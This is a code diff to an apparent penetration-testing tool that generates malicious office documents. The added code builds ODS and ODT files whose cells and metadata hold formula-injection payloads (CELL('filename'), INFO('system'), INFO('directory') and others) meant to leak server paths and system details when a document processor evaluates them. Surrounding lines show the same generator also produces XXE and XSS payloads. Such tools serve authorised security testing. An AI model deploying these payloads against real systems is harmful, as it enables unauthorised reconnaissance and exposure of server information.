@@ -24,6 +24,93 @@ def generate_office_payloads(output_dir, ext, burp_collab):
     xxe_dir.mkdir(exist_ok=True)
     xss_dir = ext_dir / 'xss'
     xss_dir.mkdir(exist_ok=True)
+    info_dir = ext_dir / 'info'
+    info_dir.mkdir(exist_ok=True)
+    
+    if ext == 'ods':
+        ods_info1_cell_filename = f'''<?xml version="1.0" encoding="UTF-8"?>
+<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
+<office:body>
+<office:spreadsheet>
+<table:table>
+<table:table-row>
+<table:table-cell office:value-type="string">
+<text:p>=CELL("filename")</text:p>
+</table:table-cell>
+</table:table-row>
+</table:table>
+</office:spreadsheet>
+</office:body>
+</office:document>'''
+        
+        output_file = info_dir / "info1_cell_filename.ods"
+        with tempfile.TemporaryDirectory() as temp_dir:
+            temp_path = Path(temp_dir)
+            (temp_path / "content.xml").write_text(ods_info1_cell_filename)
+            (temp_path / "META-INF").mkdir()
+            (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
+            (temp_path / "meta.xml").write_text('<?xml version="1.0"?><office:document-meta xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0"><office:meta><meta:initial-creator>=CELL("filename")</meta:initial-creator></office:meta></office:document-meta>')
+            
+            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+                for file_path in temp_path.rglob('*'):
+                    if file_path.is_file():
+                        arcname = file_path.relative_to(temp_path)
+                        zip_ref.write(file_path, arcname)
+        
+        for formula, name in [('=INFO("version")', 'info2_info_version'), ('=INFO("system")', 'info3_info_system'), ('=NOW()', 'info4_now'), ('=INFO("directory")', 'info5_info_directory')]:
+            ods_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
+<office:body>
+<office:spreadsheet>
+<table:table>
+<table:table-row>
+<table:table-cell office:value-type="string">
+<text:p>{formula}</text:p>
+</table:table-cell>
+</table:table-row>
+</table:table>
+</office:spreadsheet>
+</office:body>
+</office:document>'''
+            
+            output_file = info_dir / f"{name}.ods"
+            with tempfile.TemporaryDirectory() as temp_dir:
+                temp_path = Path(temp_dir)
+                (temp_path / "content.xml").write_text(ods_content)
+                (temp_path / "META-INF").mkdir()
+                (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
+                (temp_path / "meta.xml").write_text(f'<?xml version="1.0"?><office:document-meta xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0"><office:meta><meta:initial-creator>{formula}</meta:initial-creator></office:meta></office:document-meta>')
+                
+                with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+                    for file_path in temp_path.rglob('*'):
+                        if file_path.is_file():
+                            arcname = file_path.relative_to(temp_path)
+                            zip_ref.write(file_path, arcname)
+    
+    if ext == 'odt':
+        for formula, name in [('=CELL("filename")', 'info1_cell_filename'), ('=INFO("version")', 'info2_info_version'), ('=INFO("system")', 'info3_info_system'), ('=NOW()', 'info4_now'), ('=INFO("directory")', 'info5_info_directory')]:
+            odt_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">
+<office:body>
+<office:text>
+<text:p>{formula}</text:p>
+</office:text>
+</office:body>
+</office:document>'''
+            
+            output_file = info_dir / f"{name}.odt"
+            with tempfile.TemporaryDirectory() as temp_dir:
+                temp_path = Path(temp_dir)
+                (temp_path / "content.xml").write_text(odt_content)
+                (temp_path / "META-INF").mkdir()
+                (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
+                (temp_path / "meta.xml").write_text(f'<?xml version="1.0"?><office:document-meta xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0"><office:meta><meta:initial-creator>{formula}</meta:initial-creator></office:meta></office:document-meta>')
+                
+                with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+                    for file_path in temp_path.rglob('*'):
+                        if file_path.is_file():
+                            arcname = file_path.relative_to(temp_path)
+                            zip_ref.write(file_path, arcname)
     
     odt_xxe1_doctype = f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
